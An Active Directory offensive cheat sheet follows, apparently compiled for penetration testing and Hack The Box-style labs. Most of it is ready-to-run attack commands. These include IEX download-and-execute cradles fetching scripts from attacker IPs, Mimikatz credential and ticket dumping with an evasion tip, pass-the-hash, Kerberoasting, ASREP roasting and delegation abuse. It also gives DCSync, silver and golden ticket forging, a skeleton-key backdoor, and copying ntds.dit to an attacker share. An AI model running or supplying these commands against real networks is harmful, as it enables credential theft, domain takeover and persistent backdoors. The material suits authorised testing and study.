# AD Cheat Sheet

## Theory

#### AD Structure

* Domain Controller (DC) is a Windows Server containing Active Directory Domain Services (AD DS)
* AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
* **NTDS.dit** is stored by default in %SystemRoot%\NTDS  
```
# Or find ntds.dit using Powershell
Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
```
* DC handles authentication and authorization services 
* DC replicate updates from other domain controllers in the forest
* DC Allows admin access to manage domain resources

#### Forest
* Forest: collection of one or more trees
* Tree: collection of several domains with hierarchical order
* Organizational Units (OUs): Containers for groups, computers, users, printers and other OUs
* Trusts: Allows users to access resources in other domains
* Objects: users, groups, printers, computers, shares
* Domain Services: DNS Server, LLMNR, IPv6, MSSQL etc.
* Domain Schema: Rules for object creation

Example structre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.

#### Users

Users are core of AD and DC's task is to manage access of those users to services.

* Domain Admins (DA): have ultimate control over the domain. They can access to the domain controller. If DA is compromised then NTDS.dit can be dumped using dsync attack.
* Service Accounts (can be also have Domain Admin rights): required by Windows for services such as SQL to pair a service with a service account. Some of them are associated with user accounts and have human-made passwords what makes them vulnerable to Kerberoasting attacks. 
* Local Administrators: local machine administrators. Compromis of local admin can lead to ticket and credentials grabbing from local machine to impersonate other users and services in AD.
* Domain Users: normal users. They can log into machines where they are authorized to. Users may be part of interesting groups that allows lateral movement once the user account is compromised.

#### Groups

* Security Groups: permissions users and services. Some groups have rights to change DACLs.
* Distribution Groups: email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

## Active Directory Enumeration

### Manual Approach

#### net.exe

'net.exe' system utility is widely available and can be used once foothold on windows host within domain is obtained.

* `net user`
* `net user /domain` returns a list of users to work with
* `net user some_admin /domain` info about some_admin
* `net group /domain`
* `net accounts` lookup AD password policy

#### Domain Controller Discovery
For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located


* **Troubleshooting**: `nltest /dsgetdc:domain.local`
* **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local`
* **Using nltest**: `nltest /dclist:domain.local`

#### Domain Hosts Discovery

* NetBios scan: `nbtscan 192.168.100.0/24`
* LDAP query of domain base (credentials required): `ldapsearch -H ldap://dc.ip -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem" `
* NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
* Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)

#### Users discovery

`ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`

#### Domain dump with ldap
```
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt

ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```



### Tooling based Approach

* Helpful **Tools**:

* crackmapexec
* `enum4linux -a target_ip > enum.log`

* AD recon: https://github.com/sense-of-security/ADRecon
* Bloodhound: https://github.com/BloodHoundAD/BloodHound
* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast


#### Kerbrute

* kerbrute

`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`

* Nmap
```
nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spookysec.local', userdb=userlist.txt 10.10.43.76"
```

#### PowerView

* Poverview has a lot of built-in AD functionalities
* So once a domain machine is compromised, upload and run powerview on it

```powershell

# download and execute commands

IEX(New-Object Net.WebClient).downloadString('http://192.168.1.xxx/PowerView.ps1'); Get-NetComputer | select cn;


```

* Useful poverview commands

``` powershell
#get all computers in AD

Get-NetComputer | select cn

# users

Get-NetUser | select cn

# groups 

Get-NetGroup
```

* It is important to find high value target users and where they are currently logged in to later compromise those machines and retrieve tickets or hashes.

``` powershell
# currently logged in users

Get-NetLoggedon -ComputerName client251

# active sessions to DC

Get-NetSession -ComputerName dc01

```

### Bloodhound: AD Discovery

Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

1. Get Sharphound on target host to collect data for Bloodhound
```
iex(new-object net.webclient).downloadstring("http://10.10.14.43/AzureHound.ps1")

Collecting your data set with AzureHound:

PS C:\> Import-Module Az
PS C:\> Import-Module AzureADPreview
PS C:\> Connect-AzureAD
PS C:\> Connect-AzAccount
PS C:\> . .\AzureHound.ps1
PS C:\> Invoke-AzureHound
```

alternative oneliner

`IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1') ; Invoke-BloodHound`

2. Invoke Bloodhound on target host and harvest data
`invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`

OR

use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:

`./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`

#### Launching Bloodhound and AD Visualization

1. launch neo4j: `sudo neo4j console`
2. launch GUI: `bloodhound`
3. click on Upload Data in the upper right corner
4. Right-Click on free are on the screen and select "Reload Query"

## Exploitation

Try attacking AD in this order:
Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/

* Kerberos brute-force
* ASREPRoast
* Kerberoasting
* Pass the hash
* Pass the Ticket
* Overpass the Hash
* Pass the ticket
* Silver ticket
* Golden ticket

### Local Host Memmory Dumping

Most of the AD attacks shall require hash or ticket that can be only extracted with SYSTEM rights from the target host.

```powershell

#engage the SeDebugPrivlege
privilege::debug

#dump the credentials of all logged-on users using the Sekurlsa
sekurlsa::logonpasswords

#dump tickets
sekurlsa::tickets

```


```powershell
# never use mimikatz as a standalone tool as it shall get detected
# instead inject it into memmory using this module from ps mafia

https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

```

### Request Service Ticket

If name of particular service is know, ticket can be requested for later attempting to crack its hash.

```powershell 

iex(New-Object Net.WebClient).DownloadString('http://192.168.119.181/Request_ST.ps1')

#list all user tickets

klist

```

* after this the service can be accessed 

### Pass the Hash

If hash is obtained from the memmory of compromised host, use it with pth-winexe kali tool

```bash

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

### Overpass the Hash

This attack uses NTLM hash to obtain a TGT to gain further access

```bash
#use mimikatz to obtain powershell session as admin if NTLM hash is available

sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

```

* sometimes it is needed to authenticate with current session to obtain TGT

`net use \\dc01`

after that DC shall provide a TGT

* use psexec to gain remote access

`.\PsExec.exe \\dc01 cmd.exe`

### Brute Force ASREP roast

* To get user list of users use: `enum4linux`
* If local access is give then use Rubeus: `Rubeus.exe asreproast`

```

   1. Look for users via enum4linux or kerbrute. Delete stuff after first space: 
   cut -d ' ' -f 1 < users.txt  
      
   2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
    
	```
   GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx

   impacket-GetNPUsers spookysec.local/ -no-pass -usersfile spookyusers.txt -format hashcat -outputfile spooky.hash -dc-ip 10.10.43.76
   ```
	
	OR with Rubeus
	
	.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
   
   3. Use SPN roast against users in the ldapenum_spn_users.txt file
   
   Crack SPN roast and ASPREP roast output with hashcat
   
   hashcat -a 0 -m 18200 hc.txt  /usr/share/wordlists/rockyou.txt

   #Attention: save as ANSI encoding using notepad.exe if cracked in windows
```


### Remote Shell

* RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
* SMB: use some exploit from SMB cheat sheet


### Generic All

If some user or group has "Generic All" Permission on any of the other objects than this object can be easily compromised.

Tools needed:

* powermad
* Rubeus


```
# -------- On Server Side
# Upload tools
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe

# Import PowerMad
. .\pm.ps1

# Set variables
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"

# With Powermad, Add the new fake computer object to AD.
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

# With Built-in AD modules, check that the last command worked.
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount


# With Rubeus, generate the new fake computer object password hashes. 
#  Since we created the computer object with the password 123456 we will need those hashes
#  for the next step.
./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb

# -------- On Attck Box Side.
# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

# Set local variable of KERB5CCNAME to pass the ccache TGT file for the requested service.
export KRB5CCNAME=administrator.ccache

# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
#  over SMB protocol.
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k

```
source> https://cybergladius.com/htb-walkthrough-support/


### Dsync Attack
Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync

* Find accounts with permissions for DSync using **powerview**

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

```

* Dump Admin credentials with an account that has **permissions to do so**

`secretsdump.py xxx/usename@10.10.10.xxx -just-dc-user Administrator` 

* Use extracted hash to perform pass the hash attack

`psexec.py -hashes :32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`

or using evil-winrm

`evil-winrm -i 10.10.43.76 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

PSexec can also be yused from windows client

`.\PSExec.exe \\dc1.domain.com cmd`

### Kerberoasting

* If local access is give then use Rubeus: 

Check first: `Rubeus.exe kerberoast /stats`
Roast: `Rubeus.exe kerberoast`


* Look for kerberoastable accounts:

`ldapsearch -H ldap://10.11.1.xxx -x -LLL -W -b "dc=xxx,dc=com" "(&(samAccountType=805306368)(servicePrincipalName=*))"`

if credentials available then login using parameters
`ldapsearch -H ldap://10.11.1.xxx -D 'Domain.com/User' -w 'PAsswrord'` 
 
* get TGSs for cracking 

```
GetUserSPNs.py xxx.com/xxx:xxx -outputfile hashes.kroast -dc-ip 10.11.1.xxx

OR Rubeus

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast


Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

```


* And finally, crack the hash
`hashcat -a 0 -m 13100 --force SPN.hash /wordlists/rockyou.txt`

### Pass the Ticket

#### No TGT provided

1. Obtain SID of the domain

```powershell

whoami /user

# SID are all numbers execpt the last four (rel identifier) 

```


#### If TGT provided

* dump TGT from LSASS
* use TGT toact as domain admin by injecting it into current login sessions ID
* access services that can be accessed by the admin owner of the ticket


1. Perform triage with Rubeus: `.\Rubeus.exe triage`
2. see which tickets provide access to tgt
3. Dump these tickets with Rubeus: `.\Rubeus.exe dump /user:user_that_accessed_tgt`
4. Copy base64TGT and convert it to a single line string:
```
Windows:
$base64RubeusTGT=$(Get-Content ./tgt.txt) # where tgt.txt contains unstructured base64
$base64RubeusTGT.Replace(" ","").replace("`n","")

Linux:
tr -d '\n' < tgt.txt | tr -d ' '

Make kirbi ticket from BASE64 blob
[IO.File]::WriteAllBytes("c:\ok\xxx.kirbi", [Convert]::FromBase64String($xxx))

```
5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`

## Silver Ticket
Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets

Typical workflow:
1. Compromise some Computer within AD
2. Dump Hash: mimikatz, lsassy (more silent)
3. Forge NTLM hash RC4 (or better) for later use
compromised password -> https://www.browserling.com/tools/ntlm-hash
4. Forge ticket using rubeus:
`Rubeus.exe silver /service:SQL/someDC:6565/SQL /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)

## Golden Ticket

### Mimikatz Golden Ticket

1. Dump SID and hash and inject it into memmory

`lsadump::lsa /inject /name:krbtgt`

2. Create golden Ticket

`Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`

## Sekeleton key

It backdoors AD with a key implanted in DC memmory: mimikatz

`misc::skeleton`

for example access share using skeleton key

`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`

Access anything without knowing the user

`dir \\Desktop-1\c$ /user:Machine1 mimikatz`


## Hash cracking


* MsCacheV2

`hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85fxxx' /usr/share/wordlists/rockyou.txt --force --potfile-disable`

* NTLM

`hashcat -a 0 -m 1000 admin.hashfile  /usr/share/wordlists/rockyou.txt --force --potfile-disable`


## Dumping Credentials

### lsassy

This is preferred and most silent way of dumping AD contents.

use `lsassy`

For that you are going to need credentials: local, ntlm, or ticket

### ntds.dit exfiltration using NTDSUTIL

dit-file with AD credentials can be dumped in a variety of ways once System privilege is obtained on domain controller

Make a fake AD installation file
`NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full C:\Files" "q" "q"`

Copy it to attacking machine
`Copy-Item -Path  C:\Files -Destination  '\\192.168.219.129\dumb' -Recurse`

Contents should be like
```
└─$ tree Files    
Files
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
└── registry
    ├── SECURITY
    └── SYSTEM
```

Then secretsdump.py can be used to decrypt and dump hashes from ntds.dit.

For doing that authentification information of DC needed.

Best best is to use lsassy remotely or mimikatz/rubeus to get hashes locally.

`lsassy -u LocalBob -p Password1 192.168.219.133`

then you get something like

```
[+] 192.168.219.133 SKORP\BAMDC1$        [NT] 305ea2dea5d1f1e494645eb39784513a | [SHA1] d2837f19c7af41d9899d942b6d4c33663680a805
[+] 192.168.219.133 SKORP\Administrator  [NT] 64f12cddaa88057e06a81b54e73b949b | [SHA1] cba4e545b7ec918129725154b29f055e4cd5aea8
```
Grab the NT part from Administrator and construct secrets dump request

```
impacket-secretsdump -system Files/registry/SYSTEM -security Files/registry/SECURITY -ntds Files/Active\ Directory/ntds.dit -hashes :64f12cddaa88057e06a81b54e73b949b LOCAL -outputfile dit-extract
```

After that file dit-extract.ntds is going to appear in your directory

It can be then cracked using hashcat like so

`hashcat -a 0 -m 1000 -w 3  dit-extract.ntds  /usr/share/wordlists/rockyou.txt.gz --force --potfile-disable`

The cracked password is diplayed next to cracked hash that corresponds to some user like below.

Dictionary cache hit:
Filename..: /usr/share/wordlists/rockyou.txt.gz
Passwords.: 14344385
Bytes.....: 53357329
Keyspace..: 14344385

64f12cddaa88057e06a81b54e73b949b:Password1                


## Additional Reading
* Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
* Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology